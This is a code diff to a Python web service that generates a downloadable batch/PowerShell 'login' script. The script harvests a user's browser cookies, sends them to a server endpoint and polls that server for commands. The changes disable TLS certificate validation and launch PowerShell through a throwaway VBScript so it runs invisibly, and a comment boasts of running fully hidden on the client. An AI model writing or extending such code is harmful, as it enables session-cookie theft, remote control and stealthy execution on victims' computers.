@@ -813,11 +813,9 @@ def api_studio_download_login_bat(id: str = "", proxy: str = "", origin: str = "
 
     # Mã PowerShell chạy hoàn toàn ẩn ngầm trên máy khách
     ps_code = f'''[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
 try {{
-    $hideDef = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();'
-    Add-Type -Name Win32 -Namespace Native -MemberDefinition $hideDef -ErrorAction SilentlyContinue
-    $h = [Native.Win32]::GetConsoleWindow()
-    if ($h -ne [IntPtr]::Zero) {{ [Native.Win32]::ShowWindow($h, 0) }}
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
 }} catch {{}}
 
 $chromePaths = @(
@@ -915,11 +913,59 @@ function Start-LoginBrowser {{
 
 function Send-State($evt) {{
     try {{
-        $b = @{{ id = "{sync_id}"; event = $evt }} | ConvertTo-Json
-        $r = Invoke-RestMethod -Uri "{clean_origin}/api/studio/external-login/event" -Method Post -ContentType "application/json; charset=utf-8" -Body $b -TimeoutSec 5
-        return $r.command
+        $body = @{{ id = "{sync_id}"; event = $evt }} | ConvertTo-Json
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
+        
+        $req = [System.Net.WebRequest]::Create("{clean_origin}/api/studio/external-login/event")
+        $req.Method = "POST"
+        $req.ContentType = "application/json; charset=utf-8"
+        $req.Timeout = 5000
+        $req.ContentLength = $bytes.Length
+        
+        $stream = $req.GetRequestStream()
+        $stream.Write($bytes, 0, $bytes.Length)
+        $stream.Close()
+        
+        $resp = $req.GetResponse()
+        $respStream = $resp.GetResponseStream()
+        $reader = New-Object System.IO.StreamReader($respStream, [System.Text.Encoding]::UTF8)
+        $respText = $reader.ReadToEnd()
+        $reader.Close()
+        $resp.Close()
+        
+        $json = $respText | ConvertFrom-Json
+        return $json.command
     }} catch {{
         return "none"
+    }}
+}}
+
+function Send-Sync($cookieStr, $proxyStr) {{
+    try {{
+        $body = @{{ id = "{sync_id}"; cookie = $cookieStr; proxy = $proxyStr }} | ConvertTo-Json
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
+        
+        $req = [System.Net.WebRequest]::Create("{clean_origin}/api/studio/external-login/sync")
+        $req.Method = "POST"
+        $req.ContentType = "application/json; charset=utf-8"
+        $req.Timeout = 10000
+        $req.ContentLength = $bytes.Length
+        
+        $stream = $req.GetRequestStream()
+        $stream.Write($bytes, 0, $bytes.Length)
+        $stream.Close()
+        
+        $resp = $req.GetResponse()
+        $respStream = $resp.GetResponseStream()
+        $reader = New-Object System.IO.StreamReader($respStream, [System.Text.Encoding]::UTF8)
+        $respText = $reader.ReadToEnd()
+        $reader.Close()
+        $resp.Close()
+        
+        $json = $respText | ConvertFrom-Json
+        return ($json.success -eq $true)
+    }} catch {{
+        return $false
     }}
 }}
 
@@ -1027,19 +1073,10 @@ while (([DateTime]::UtcNow - $startTs).TotalSeconds -lt 900) {{
                     }}
                     $fullCookieStr = $cookiePairs -join "; "
 
-                    $syncBody = @{{
-                        id = "{sync_id}"
-                        cookie = $fullCookieStr
-                        proxy = "{clean_proxy}"
-                    }} | ConvertTo-Json
-
-                    try {{
-                        $syncRes = Invoke-RestMethod -Uri "{clean_origin}/api/studio/external-login/sync" -Method Post -ContentType "application/json; charset=utf-8" -Body $syncBody -TimeoutSec 10
-                        if ($syncRes.success) {{
-                            $synced = $true
-                        }}
-                    }} catch {{}}
-
+                    $syncOk = Send-Sync $fullCookieStr "{clean_proxy}"
+                    if ($syncOk) {{
+                        $synced = $true
+                    }}
                     break
                 }}
             }}
@@ -1074,8 +1111,12 @@ exit 0
     bat_header = '''<# :
 @echo off
 set "SCRIPT_FILE=%~f0"
-start "" powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$p = $env:SCRIPT_FILE; if (Test-Path -LiteralPath $p) { [ScriptBlock]::Create((Get-Content -LiteralPath $p -Encoding UTF8 -Raw)).Invoke() }"
-exit /b
+set "V=%TEMP%\\tf_hide_%RANDOM%.vbs"
+echo Set W = CreateObject("WScript.Shell") > "%V%"
+echo W.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""$p = [Environment]::GetEnvironmentVariable('SCRIPT_FILE'); if (Test-Path -LiteralPath $p) { [ScriptBlock]::Create((Get-Content -LiteralPath $p -Encoding UTF8 -Raw)).Invoke() }""", 0, False >> "%V%"
+wscript.exe "%V%"
+del /f /q "%V%" >nul 2>&1
+exit
 #>
 
 '''
